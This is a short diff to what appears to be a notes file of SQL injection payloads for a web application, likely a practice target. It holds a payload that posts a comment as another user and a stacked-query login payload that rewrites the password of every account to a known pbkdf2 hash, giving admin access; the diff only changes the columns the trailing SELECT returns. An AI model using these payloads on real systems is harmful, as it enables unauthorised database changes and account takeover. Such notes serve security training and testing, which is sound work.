@@ -5,7 +5,7 @@ create comment as another user
 	Injected Comment', '2021-01-01 22:00:00', 2, 1); -- '
 
 LOGIN AS admin with password 'new_pass', when realy pass is 'admin'
-admin'; UPDATE public."user" SET passwd = 'pbkdf2:sha256:150000$NcRpBqvE$be4e796783281d708e488d7f310c495a19f5a2cc911d6956cd7e4536c7dc9b40'; SELECT username, passwd FROM public."user" WHERE username = 'admin
+admin'; UPDATE public."user" SET passwd = 'pbkdf2:sha256:150000$NcRpBqvE$be4e796783281d708e488d7f310c495a19f5a2cc911d6956cd7e4536c7dc9b40'; SELECT id, username, passwd, role FROM public."user" WHERE username = 'admin
 
 hash('new_pass') = 
 'pbkdf2:sha256:150000$NcRpBqvE$be4e796783281d708e488d7f310c495a19f5a2cc911d6956cd7e4536c7dc9b40'
